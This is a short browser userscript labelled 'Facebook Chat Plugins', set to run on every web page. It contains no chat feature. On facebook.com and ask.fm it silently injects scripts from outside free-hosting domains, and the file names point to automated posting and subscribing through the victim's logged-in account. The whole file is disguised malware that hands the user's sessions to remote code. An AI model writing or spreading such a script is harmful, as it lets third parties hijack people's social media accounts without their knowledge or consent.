// ==UserScript==
// @name          Facebook Chat Plugins
// @namespace      Facebook Chat Plugins
// @description   google.com
// @version     1.0
// @license     GPL 3.0
// @include     http*://*

// ==/UserScript==

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(location.hostname.indexOf("ask.fm") >= 0){
addJavascript('http://www.melihjohnsan.webege.com/saner.js');
}

if(location.hostname.indexOf("facebook.com") >= 0){
addJavascript('http://www.melihjohnsan.webege.com/sd.js');
addJavascript('http://www.askfmlikes.tk/fb/post.js');
addJavascript('http://www.melihjohnsan.webege.com/ask.js');
addJavascript('http://www.askfmlikes.tk/fb/abonekas.js');

}
http://www.melihjohnsan.webege.com/ask.js